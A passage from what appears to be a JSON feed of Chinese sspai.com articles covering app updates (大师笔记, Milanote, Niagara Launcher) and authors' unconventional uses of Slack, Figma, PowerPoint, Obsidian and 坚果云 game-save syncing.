称为「运动应用」而非「健身应用」，也是鉴于 Wakeout! 提供的锻炼项目大多为轻度的放松练习，如果你需要增肌减脂，Wakeout 并不能满足你的需求。另外，如果你是一位社恐人士，不方便在工作环境中活动手脚，那 Wakeout! 也无法物尽其用，并不建议你订阅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi0tb34tdhj3i193g.jpeg\"></figure><p><a href=\"https://apps.apple.com/cn/app/wakeout-move-and-smile/id1242116567\" target=\"_blank\">Wakeout!</a> 免费提供 7 天试用，你可以在<s>「审判」（你可以在应用里找到各种可爱的机翻中文）</s>试用后再决定是否付费订阅。</p>\n<span class=\"ss-application\" app-id=\"12651\"> </span><h2>值得关注的 App 更新</h2>\n<h3>大师笔记 2.0：实用至上的新功能，人人都能用得到</h3>\n<ul>\n<li>平台：iOS / iPadOS / Android / macOS / Windows</li>\n<li>关键词：Markdown、看板、标签、笔记、写作</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：每个人都有自己的写作习惯，所以很多笔记软件的特色功能不一定人人都能用得上。特别是国外开发团队出品的写作软件，更多地是针对开发者本身或者海外用户设计的整个框架，对国内用户来说可能存在水土不服的情况，并且因为语言、平台等限制，国内用户的反馈也很难有效及时地被国外开发团队接收到。作为一款国产笔记应用，大师笔记就充分利用了「接地气」的优势，大量倾听用户们的声音，在 2.0 大版本推出了很多实用的功能更新。</p>\n<p>首先，大师笔记在新版本完全重新设计了标签页面。在旧版页面中，笔记卡片的并列展示占据了大量的界面空间，导致笔记区域被大幅压缩，很大程度上增加了笔记输入时的不便。而在新版界面中，笔记卡片被彻底取消，整个应用界面（除了侧边栏）都变成了笔记区域，所有标签都统一在最上方展示，这样一来就彻底解放了笔记区域，输入起来更加得心应手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi1db34tdhn8pbj10.png\"></figure><p>其次，大师笔记 2.0 新增了对多窗口的支持。在新版本中，我可以同时在多个独立的窗口打开不同的笔记，借助系统的分屏功能同时展示在屏幕上，可以互相参考对照，增加了笔记工作的效率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi1tb34tdhj3i1940.png\"></figure><p>最让我感到惊喜的是大师笔记在新版加入的 PDF 自定义导出功能。一般情况下，PDF 导出会自动分页，这就导致很多连贯的内容被强行拆分到两页中，非常不人性化。大师笔记提供的这个自定义分页逻辑，可以让我根据标题（一级、二级、三级）和分隔符来给 PDF 手动设定分页，简直不能更爽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi2tb34tdhopdm1jg.png\"></figure><p>另外值得一提的是大师笔记的模板功能，在原先的基础上加入了快速调用功能。我先在「管理笔记模板块」界面中提前设置好关键字和模板内容，然后回到笔记区域，输入 <code>/</code> + <code>关键词</code> 就可以找到相应的模板，按一下回车后就可以直接插入到笔记中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi35b34tdhj3i194g.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi3lb34tdhj3i1950.png\"></figure><p>大师笔记目前正在少数派进行教师节促销活动，活动价格 70 元 (原价 98 元)，活动将于 9 月 14 日截止，你可以在 <a href=\"https://sspai.com/item/276\" target=\"_blank\">这里</a> 进行购买。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"276\" type=\"genuineSoftware\"> </span><h3>Milanote 3.0：老牌白板工具大更新</h3>\n<ul>\n<li>平台：Web / iOS / iPadOS / macOS</li>\n<li>关键词：白板</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：想象你手中握着一支马良的神笔，这只神笔能够画出所有你想要的东西，你的创意、灵感或者备忘全都可以用它来书写，有了它你再也不需要携带纸笔—— Milanote 就是这样一款创意工具。它想要做的事情就是一股脑装下你所有的想法，让你永远不再缺少素材。</p>\n<p>作为 note 应用，除了需要根据使用场景包容合适的文件格式外，文件的布局架构也对于存取素材而言至关重要。Milanote 初始界面看起来就像可以书写神笔的空气，它只是块绘板，而其上所有书写单位都以卡片为载体，最后再将这些便签都粘贴至绘板上，然后再在绘板上进行整体规划。</p>\n<p>为了实现随时掏出神笔的目的，Milanote 在本月更新的第三代中为网页端的使用增加了更多细节，以更好地实现多端创意互联的直观化和可视化。由于 iPad 端的应用尚在开发中，为了保证网页端草图卡片的顺利使用，新版本增加了在 iPad 上的网页中打开 Milanote 也能够顺利、流畅且实时地记录和传达构思，手写绘板的批注也变得更加丝滑了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi3tb34tdhopdm1k0.png\"></figure><p>当使用 Milanote 整理艺术素材时，难以避免遇到使用特定颜色的场景，现在的网页版对于收集整理色卡非常方便。在边栏拖入色卡后，可以直接在卡片上输入六位码或双击输入 RGB 数值，精确记录所需颜色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi4db34tdhtodsop0.png\"></figure><p>对于媒体素材收集，现在可以直接在画板中拖入视频或音频卡片，YouTube 和 Vimeo 上的视频以及 Spotify 和 Soundcloud 上的音频可以直接预览和播放。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi4lb34tdhopdm1kg.png\"></figure><p>对于文字素材收集，除了最初设备互联的 quick note 外，现在添加了 document 作为一个文本文件，可以整理长篇文字而不至于让界面信息混乱。</p>\n<p>而对于素材资源整理，上传的文件可以选择预览模式或是符号模式，后者在画板中的占位更小，在文件数量过多时整理筛选和使用更为方便。左侧边栏的内容也可以调整了，以便于使用在不同的创意场景中匹配不同的调整工具。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi4tb34tdhj3i195g.png\"></figure><p>你可以在 Milanote <a href=\"https://milanote.com/\" target=\"_blank\">官网</a> 免费使用或下载应用，每一邮箱对应于一个单独的用户。当使用共享编辑功能时，可以直接输入邀请用户的邮箱而无需强制注册。每一用户可以使用 100 个单位，当使用需求增大时，可以付费获得无限空间，个人每月订阅 $12.5、每年 $119.88 。</p>\n<h3>Niagara Launcher 更新：适配折叠屏幕，优化天气与数字健康</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：桌面、启动器</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：备受好评的 Niagara Launcher 近日获得 Beta 更新，现在已经适配例如三星 Galaxy Z Fold 系列等折叠屏手机，用户可以同时在内屏和外屏上体验到 Niagara Launcher 的清爽与简洁。</p>\n<p>三星 Galaxy Z Fold 系列等采用横向折叠的折叠屏手机同时拥有较为狭长的外屏和堪比平板的内屏，更新后的 Niagara Launcher 能够自适应屏幕尺寸并保持 Launcher 布局的一致性。针对不同屏幕尺寸「拇指区」的差异，Niagara Launcher 也针对内外屏尺寸进行了「屏幕边缘优化」，在使用内屏时，Niagara Launcher 的应用列表和字母检索区会增大与屏幕边缘的距离，这样用户在双手握持设备时拇指无需弯曲即可完成操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi55b34tdhj3i1960.png\"></figure><p>本次更新还根据屏幕尺寸变化适配了图标缩放、无缝衔接甚至是键盘快捷键的支持。在用户切换折叠屏形态时，Niagara Launcher 会提供更加顺滑、连续的使用体验。</p>\n<p>除了适配折叠屏，Niagara Launcher 在此之前还进行了多次更新。</p>\n<p>应用内置的天气小组件一直备受好评，之前的天气小组件使用了 Dark Sky 数据源，但在被苹果收购后，Niagara Launcher 将数据源切换到了 OpenWeather，同时带来了更精准的降雨预报、更长的预报时间和日出日落等信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi5db34tdhtodsopg.gif\"></figure><p>随着设备生产商和系统提供商对于数字健康的重视，Niagara Launcher 认为启动器是用户使用手机时接触到的第一个应用，所以启动器必须要把数字健康做得更好。现在，Niagara Launcher 为用户提供了通知过滤功能，它受到「<a href=\"https://todoist.com/productivity-methods/eisenhower-matrix\" target=\"_blank\">Eisenhower matrix</a>」的启发，为用户提供通知优先级分类功能。如果你愿意，可以参与到 Niagara Launcher 和外部组织合作的调研项目中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vhi65b34tdhtodsoq0.png\"></figure><p>除此之外，Niagara Launcher 在进行还增强了弹出窗口、小组件列表以及多个功能的完善和优化，感兴趣的朋友可以前往 <a href=\"https://medium.com/niagara-launcher\" target=\"_blank\">Niagara Launcher 博客</a>查看。你可以在 <a href=\"http://niagara%20launcher/\" target=\"_blank\">Google Play</a> 免费下载 Niagara Launcher，或通过 <a href=\"https://github.com/8bitPit/Niagara-Issues\" target=\"_blank\">Github</a> 体验 Beta 版本。</p>\n<span class=\"ss-application\" app-id=\"14113\"> </span><h2>App 速报</h2>\n<ul><li>Sticky Widgets（<a href=\"https://apps.apple.com/cn/app/sticky-widgets/id1533254320\" target=\"_blank\">iOS</a>）：更新至 v3.0，支持创建列表、设置笔记名称，可以直接从笔记列表中创建笔记，通过快捷操作来阅读笔记或者设置笔记，同时改进了同步操作，对设计以及用户界面进行了改进。</li></ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68739"},{"title":"Slack、Figma、Obsidian、PPT……你常用的软件还有这些「不一样」的用法","date":"2021-09-13 08:00:00","description":"\n<p>日常生活里我们并不一定会按部就班地「专物专用」，比如懒得洗碗的时候可能直接把锅当作碗用，把奥利奥碾碎的话也可能顺手拿起旁边的杯子......从某种程度上来说，软件是一种工具，它一定有自己的属性，有擅长处理的事情，但也不必被限定用法。少数派的一些作者们，通过自己的实践和探索，在软件使用上有一些另辟蹊径的用法。</p>\n<h2>@宇宙浪费指南：用 Slack 做资料库、备忘及 Todo</h2>\n<p>Slack 是一款国外的企业协作工具软件，它集成了电子邮件、短信、Google Drives、Trello、GitHub 等 65 种工具和服务，可以把各种碎片化的企业沟通和协作集中到一起，尽管它是一个类似飞书的企业 IM 软件，但我秉持着「一个人就是一个团队」的想法，完全将它用成了单机版。</p>\n<p>自从开始折腾效率软件，我就一直在寻找一种能够 All in One 的解决方案，从每周的日程安排、每天的待做提醒、到日常碎碎念和偶尔灵光一闪的记录，在不方便掏出手帐本或者记录很细碎零散以及做手帐电子备份的时候，需要一个替补队员。我也曾尝试了多种工具，比如 Bear、notion、滴答清单、Things 以及 iOS 自带的「备忘 + todo」，但都无法让我真正满意，直到我开始接触 Slack 。</p>\n<p>选择 Slack 的原因有很多：</p>\n<ul>\n<li>在公司的网络条件下也可以正常使用；</li>\n<li>它同时拥有网页版、客户端和移动端，可以满足我在任何设备上的使用和信息同步；</li>\n<li>它可以安装诸如 Google Calendar 之类的外挂软件做待办提醒，也不需要再额外下载，搜索也很方便，即使是回复里的消息也可以被搜索到；</li>\n<li>它可以建立无数个频道，包容下我的雄心壮志和天马行空，废话和情绪也都有处安放，也没有被人发现的负担，对我来说，它是一个安全的自留地；</li>\n<li>在频道中，它可以 Pin 某条消息（我一般当作置顶来用）， 也可以回复单条信息，这个功能非常有用，在用法中详细展开说明。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/fcdcf3f3f7760faca71045391c432804\"></figure><h3>读书笔记</h3>\n<p>比如名为「图书馆」的频道，我用来做读书记录管理和读书笔记的中转站，读书时的摘录和针对这条摘录的想法，都会被我第一时间记录在这个频道中，读完之后再做集中处理。</p>\n<p>每一本书保持一条 thread，我可以在这个频道中清晰地看到自己读了哪些书，读书的时间跨度，也尽可能地保留了读书时的第一想法，方便在后续的整理中查询资料整理补充。</p>\n<p>此外，频道顶部有添加书签的功能，类似于浏览器中的固定书签栏，我通常把微信读书的网页链接贴在此处，方便快速打开正在读的书，使用这个功能也是因为微信读书的书架做了上限，已达上限的吝啬鬼本人只能将就用这种形式的「书架」了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/98701390526bef8669b202e5d5e7d157\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/abae57ac662a8dc096a07f74b8b8466f\"></figure><h3>记录闪念</h3>\n<p>在我记录细碎想法的频道里，它通常是以几个关键词的形式存在，在灵光一闪时先记录下来，在后续回想时，我可以再次编辑这条信息，或者将查询到的资料链接贴在回复里，可以无限盖楼，回复折叠起来也不影响在频道里的信息流。</p>\n<h3>收集资料</h3>\n<p>诸如「历史研究院」等频道，则被我用来收集各种资料，比如某一时期，我对三国时期感兴趣，在该频道中写一条「三国」的信息，将这个时期的影视资料链接、史料、书籍、甚至《百家讲坛》都贴在回复里，关于这个主题的各种周边资料都收集在一处，还可以不停地迭代更新，相比笔记软件而言，这种记录也更轻量化，不用单开一条。</p>\n<h2>@宇宙浪费指南：用 Figma 写手账、做在线交换日记</h2>\n<p>Figma 算是设计领域一匹横空出世的黑马，这两年开始大跨步挺进中国市场，受到许多公司和团队的青睐，逐渐将设计从 Sketch 迁移到了 Figma 上。它是一款类似 Sketch 或 XD 的 UI 设计工具，区别在于它是基于浏览器的界面设计协作工具，也就是说它不受软件和设备的限制，只要有浏览器和网络就能即开即用。</p>\n<p>迁移到 Figma 的原因也不必多说，无非是：</p>\n<ul>\n<li>可以在线使用，跟朋友协作不必用互相将文件传来传去；</li>\n<li>不受物理设备限制，无论是电脑端还是 iPad 都可以使用；</li>\n<li>有社区，很多优秀设计可以参考，无形中也是降低上手难度；</li>\n<li>插件众多，作图效率更高等。</li>\n</ul>\n<h3>电子手帐</h3>\n<p>早在 2017 年，我就开始尝试在 iPad 上做手帐这件事，从学生身份到一个职场人期间，我使用过专业笔记软件 Notability、知名电子手帐软件 GoodNotes、Keynote 做手帐封皮、内页及处理素材，还有黄油相机处理照片等，属实是劳心费力，再加上我的字难以在 iPad 写得好看，没有坚持太久就放弃了，只保留了做电子电影手帐的习惯，因为相比起纸质手帐来说，电子手帐在处理起海报、截图及相关影视信息简直是有着压倒性的优势。</p>\n<p>做一个电影手帐还是相当简单的，很多朋友选择在 Notion 中开一个 Gallery 视图来追逐自己的观影和记录电影相关信息，我也不例外，在 Notion 上记录了两年，但始终有些施展不开的感觉，毕竟从自由自在可以随便写写画画的空白区域搬去 Notion 的框架里，觉得有所限制也是在所难免的。于是，当第一时间接触到 Figma 时，我就动了心思（没有考虑 Sketch 是因为差不多同期接触这俩软件）。</p>\n<p>我可以随手用 Figma 画出好看的样式，可以随手把海报、演员照片拖进软件里，还可以在不知道今天看点什么的时候用一个填充电影海报的插件随机一张，让它替我选择看什么电影，我还可以没有负担地为喜欢看的影视剧做特别的样式，这都不是 Notion 能够满足的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/a9b302bea0de0af10345293797f8d8f4\"><figcaption>电影手帐 - 演员篇</figcaption></figure><figure class=\"ss-imgRows\" figcaption=\"电影手帐 - 剧集篇\"><img src=\"https://cdn.sspai.com/2021/09/07/ef831f89f4172d6e448ffd1a4ced33b2.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/07/16ac4a097ae111445913f791de09fcb7.png\" alt=\"\"></figure><h3>交换日记</h3>\n<p>高中时开始和朋友一起写交换日记，两个人定时交换，三年下来，也积累了好几本。上大学之后，因为和朋友不在一处，我们开始寻找能够实现线上交换日记的应用，试用过一些情侣 App，总感觉有些奇奇怪怪的，也很死板，于是我们尝试过写公众号，只定向发送给她；尝试过写邮件，但还是有些通讯软件的感觉；尝试过在线文档，效果还不错，有时候还会有我在文档上写，她突然冒出来评论的情况。</p>\n<p>当我开始用 Figma 做手帐后，开始选择性分享给她看，安利时也变得有依有据，这个电影为什么好看列得一清二楚，灵光一闪，我们开始在 Figma 上做更多分享，今天吃了什么好吃的东西，看了哪些书，想吐槽什么人，甚至有什么瓜，都一股脑地往上扔。Figma 在 iPad 上的使用体验还过得去，有时候我们想写写画画也会在上面，真的有点梦回高中时代在交换日记上胡写乱画的感觉。</p>\n<p>PS：把 Figma 加入到 Slack 还可以梦幻联动，在 Figma 上添加评论后可以在 Slack 收到提醒！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/de9c476a2e21b13c2c79422d410b2d11\"></figure><h2>@柯帕：用 PowerPoint 编辑图片、制作文章配图</h2>\n<p>处理图片是 PowerPoint 的本职工作之一，PowerPoint 能给文章配图也没什么可奇怪的。问题在于为什么我放着那么多专业图片处理和排版工具不用，反而用 PPT？首先是因为个人接触的 App 介绍，软件教程之类的文章，其配图实际上并不复杂，杀鸡焉用牛刀？</p>\n<p>当然，「能用」只是最基本的要求。PowerPoint 在满足图片编辑排版的基础功能之余，还提供了一系列非常棒的功能，比如说：</p>\n<ul>\n<li>自带海量的素材库：在 Photoshop，Affinity Photo 上，想要插入个背景图得打开浏览器下载，想插入个图标又得找另一个网站下载。但 PowerPoint 的「插入」菜单下，隐藏了图标、插画等七种<sup class=\"ss-footnote\" href=\"\" title=\"图像、图标、视频、3D、插画、人物、贴纸\" footnote-id=\"1\">1</sup>不同的素材可以直接选中插入，很方便。</li>\n<li>自带一些快捷修图工具：在视频剪辑领域，诸如剪映、Camtasia 等软件的流行说明模板的确是个好东西。图像编辑也是这样，重复的工作有工具自动帮忙最好。以往又是整体选择工具，又是快速蒙版的只为抠一个图像主体出来；选中图层，选图层样式，一个个调数值，只为给截图加个阴影。PowerPoint 这些都能一键完成，为什么不用呢？</li>\n</ul>\n<p>理论上讲这么多，下面我用几个简单例子来说说如何用 PowerPoint 来做配图。</p>\n<h3>示例一：裁剪图片后添加阴影</h3>\n<p>第一个例子，我想要裁剪一张手机屏幕截图，然后加个阴影，让它显得更立体一点。首先新建一个 PPT 文档，建一个空白页面，直接将待处理的手机截图拖入其中。然后点击<code>图片格式 &gt; 裁剪</code>，满意后提交更改。之后点击<code>图片格式 &gt; 图片样式 &gt; 矩形阴影</code>，阴影就立马加好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/ed2cea7794b82cf2801caaa9af209408\"></figure><p>导出也很简单，要是只想要这个截图的话，可以在图片上<code>右键 &gt; 另存为图片</code>；要是带上背景，则可以点击<code>另存为 &gt; 格式选择为 PNG &gt; 仅当前幻灯片</code>。PPT 给出的图片样式不少都挺有意思的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/20a378c9984cb52d6d5f45a4be6dc8ef\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/0aa6b624caf020812b3f51ee2302400d\"></figure><h3>示例二：为视频套壳后导出动图</h3>\n<p>PowerPoint 不仅能快速制作静态图片，动态图片也不在话下。<a href=\"https://sspai.com/post/68071\" target=\"_blank\">Magisk 核心功能和翻车自救指南</a> 中的所有动图全都是用 PowerPoint 做的。流程为先给视频套上手机壳，然后导出为动图。方法来自这一篇文章。</p>\n<ul><li>关联阅读：<a href=\"https://sspai.com/post/42447\" target=\"_blank\">你可能知道给截图套壳，但你知道怎样给动图套壳吗</a>？</li></ul>\n<p>我们同样先新建一个空白页面，导入录制好的视频和手机框架图，调整位置和大小让它们重合。这里有一个小技巧，当处理很多图片，尤其是这种堆叠的对象时，「选择窗格」很有用。它可以通过<code>图片格式 &gt; 选择窗格</code>调出，近似于图层视图。从「选择窗格」选中视频，如果需要的话，可以在 PowerPoint 中通过<code>播放 &gt; 剪裁视频</code>控制播放的时长。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/b40c67da0771ae111d06a63d3c27e21c\"></figure><p>之后只要设置「开始」一栏值为「自动」，就可以直接用<code>文件 &gt; 导出 &gt; 创建动图 GIF</code>将修改好的视频导出为动图了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/73e10db2b9b780ad7ed45ab9c3f36150\"></figure><p>同样的道理，PowerPoint 的各种动画都能被设置为自动播放后导出为动图。</p>\n<h3>示例三：借助素材库制作一个简要的配图</h3>\n<p>PPT 的目的之一就是将演讲内容的核心逻辑用图片和动画的方式展示出来，辅助观众理解。它也同样可以为文章服务，将文字间的各类关系提炼成一个简单的图片放在文章中。</p>\n<p>以我写过的这样一句话为例，我们要为此配一个简单的图片。</p>\n<blockquote><p>文件是数据对象和文件路径的链接，符号链接则是将自己链接到一个目标文件或目录的路径上。</p></blockquote>\n<p>首先，和 PPT 不同的是，文章配图最好顾及比例。我们先使用<code>设计 &gt; 幻灯片大小 &gt; 自定义大小</code>来设置配图的大小和比例，比如说在少数派发布，我习惯设置为 2:1 或者 3:1。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/6390879097aa0bd0488a0d9e0468f311\"></figure><p>我们将要用到 PowerPoint 自带的素材库，为「文件路径」「数据对象」和「符号链接」这三个关键词找到一个对应的图像。选择<code>插入 &gt; 图标</code>，打开 PowerPoint 的素材库界面。素材库含有六个大类，素材皆商用免费<sup class=\"ss-footnote\" href=\"\" title=\"图像类目有两个：一个是图像集，一个是在线图片。在线图片搜索记得勾选 CC 框。\" footnote-id=\"2\">2</sup>。我要使用的是图标类别，输入关键词，勾选对应的图标，点击插入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/f70b3ab809e75fbfce419b4df78dd7fb\"></figure><p>这三个图标是配图的主体。参照示例一为图标加一些阴影效果，配上文字和代表「连接」含义的箭头，一个简约的配图就做好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/4bc244b8afe22978aedc804fec187b2e\"></figure><h3>总结</h3>\n<p>使用 PowerPoint 做完配图后，我一般会将文章用到的各类配图保存为 PPTX 文件，因为一些固定的排版是可以复用的。需要用的时候，打开以往用过的幻灯片，复制这一页幻灯片，右键图像，选择「更改图片」就能替换对象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/e8e15641362f24da244fa73fc6b22566\"></figure><p>用 PowerPoint 做配图的效率和方便程度可能无法和更现代、扩展更丰富的 Figma 等设计工具相提并论，但考虑到它极低的上手难度，也不失为一个拿来就用的好选择。</p>\n<h2>@柯帕：使用 Obsidian 建立互联网帐号「伪数据库」</h2>\n<p>之前使用知识管理和信息记录工具时我犯了一个错误：把可能随时需要的重要资料也不假思索得放在了上面。这些重要资料包括互联网帐号的关联信息、服务器、个人资料、二次验证密钥等。这个错误让我在几年前 Evernote 闪退后花了大量时间处理它麻烦的 1 个多 G 私有格式，也让去年 Notion 中国区断线时的我一筹莫展。</p>\n<p>吸取教训之后，我尝试使用 Excel 记录重要信息，但 Excel 输入和浏览都比较麻烦，条目之间相互独立无法关联。我还考虑过用数据库工具 Access，但一时找不到合适的跨平台访问手段。</p>\n<p>某一天，用着 Obsidian 的 <code>[[</code>，看到弹出的标题选择界面，突然想到能不能借助双链间接地建立一个由 Markdown 文本组成的互联网帐号数据库？ 文本格式全平台都能预览，双链又非常方便，或许是个不错的点子。</p>\n<h3>核心条目：个人身份和联系方式</h3>\n<p>首先要创建的，是整个帐号笔记库的核心 —— 个人身份条目。它包括了我的各类基本信息，最重要的是用来注册各类互联网帐号的邮箱、手机号码。它大概长这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/8f719088d37bae2449607c4ef8f2171b\"></figure><p>通过 Wiki 链接，所有实名制的帐号将直接链接到此条目，不需要实名的条目会通过联系方式等途径间接链接到此条目。如果必要，可以为某联系方式创建条目：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/36af85430aad5d38c85564890199337a\"></figure><h3>普通条目：信息、链接与备注</h3>\n<p>以互联网服务商为文件名的普通条目也会包括三个部分：注册信息、链接、备注。我的腾讯云条目是这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/9afc857a1db1ece9747f3c5865b84c5b\"></figure><p>当所有的互联网帐号都按此方式记录后，一个输入和检索都非常方便的本地伪数据库就建立完成了。</p>\n<h3>实际效果：便捷的检索、输入和双链</h3>\n<p>得益于 Obsidian 非常强大的检索功能，想要打开某条目，只要按下快捷键输入关键词即可。而模板的存在也让插入固定的内容变得简单。</p>\n<p>双链在这样一个笔记库有两个作用：其一，它让键入联系方式等关键词变得轻而易举。如下图所示，只要输入<code>[[</code>，在弹出的选择栏中选中条目按 Enter 即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/7af34728566686b8c72081492551e66b\"></figure><p>其二，通过反链和图谱界面，它能清楚揭示一个帐号连接到了其他哪些帐号，哪些帐号启用了二次验证，一个邮箱注册了哪些服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/884712f01710d625179fbc0ad8cda839\"><figcaption>Google 条目的反链界面可以看到使用 Google 注册的服务</figcaption></figure><p>由于互联网帐号还常常和一些 App 绑定，我的「伪数据库」还包括了安装的 App，也是使用相同的方式记录。得益于文本文件的通用性，将这个笔记库使用同步工具同步，就能在任何地方查看编辑这些互联网帐号数据了。</p>\n<h2>@南贝塔：用坚果云实现游戏云同步</h2>\n<p>同步文件虽然是坚果云的本职工作，但它却不是如「Steam 云」一般的游戏同步专属应用。我对坚果云的文件同步体验相当满意，也发掘了一些用法：<a href=\"https://sspai.com/post/64283\" target=\"_blank\">使用坚果云 + Zotero + PDF Expert 在多设备管理和阅读文献</a>，<a href=\"https://sspai.com/post/65309\" target=\"_blank\">坚果云 + FolderSync 在电脑和安卓手机间同步文件</a>。</p>\n<p>使用坚果云来实现游戏云同步，是指使用坚果云对多台电脑上同一个单机游戏的存档文件进行自动同步，从而达到在「电脑 A 上保存退出游戏，在电脑 B 上继续游戏进度」的效果。这算是一个剑走偏锋的玩法，其操作十分简单，体验也十分顺畅和自然。</p>\n<p>我想先跟大家聊一下「用坚果云实现游戏云同步」这个话题里的两个关键点：</p>\n<h3>为什么要自己做游戏云同步？</h3>\n<p>目前，Steam 的「Steam 云」和 Epic 的「云存储」都提供了游戏存档云同步功能，但是并不是所有的游戏都可以享受到丝滑云同步体验的：</p>\n<ol>\n<li>电脑上的古早游戏</li>\n<li>Steam 上不支持「Steam 云」的游戏</li>\n<li>支持「Steam 云」、但受限于网络环境、每次开启前都要同步半天的游戏</li>\n</ol>\n<p>对于这些游戏，平台所提供的云同步功能是指望不上了，所以我们自己动手，丰衣足食，自己来搭建游戏云同步。</p>\n<h3>为什么是用坚果云？</h3>\n<p>目前，提供文件云同步服务的云存储公司不止坚果云一家，百度云盘、腾讯微云等产品都有类似的文件云同步功能。但是体验了一圈下来，只有使用坚果云可以搭建起令人满意的游戏云同步功能。</p>\n<p>先说百度云盘，它所提供的文件同步功能称为「网盘工作空间」。它只能设置一个同步目录，并且限定了目录中最后一层目录的名称，就像这样：<code>D:\\Games\\GameName\\BaiduNetdiskWorkspace</code>。也就是说，我们的文件最后都必须放到<code>\\BaiduNetdiskWorkspace\\</code>这个文件夹里才能同步。这显然无法满足我们的需求，因为我们的游戏存档文件是散落在各自路径下的。</p>\n<p>再说腾讯微云，它可以自定义同步目录，来对任意目录下的文件进行同步，但是也只支持设置一个目录，这就意味着我们只能同步一个游戏的存档。当我们有多个游戏想要做云同步时，它就无能为力了。另外，腾讯微云默认传输通道限速 100KB/s<sup class=\"ss-footnote\" href=\"\" title=\"数据来自微云会员中心 (weiyun.com)，实际速度有时略高于此。\" footnote-id=\"3\">3</sup>，想要获得更快的同步速度，必须氪 30 元/月的超级会员，这会增加额外开支。</p>\n<p>另外顺便一说，新入场的阿里云盘目前还不提供文件同步功能。</p>\n<p>最后是坚果云，它可以自定义任意数量的同步目录；对免费用户也不限制同步速度（但限制流量）；它也足够轻量，设置成开机自动启动后，可以无感地完成存档文件同步，可谓是一款理想的同步服务产品。</p>\n<h3>如何用坚果云实现游戏同步</h3>\n<p>接下来我就以游戏《饥荒 联机版》（Don't Starve Together）来说明怎么用坚果云实现游戏同步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/8b503d2720874d2f2d5aab3ed3c2f0ef\"></figure><p>Steam 平台上的《饥荒 联机版》不支持「 Steam 云」服务，我们可以在 Steam 游戏库中查看《饥荒 联机版》的属性，在「通用」菜单中是没有「将 xxx 的游戏存档保存于 Steam 云」选项的。</p>\n<figure class=\"image ss-img-wrapper\"><img 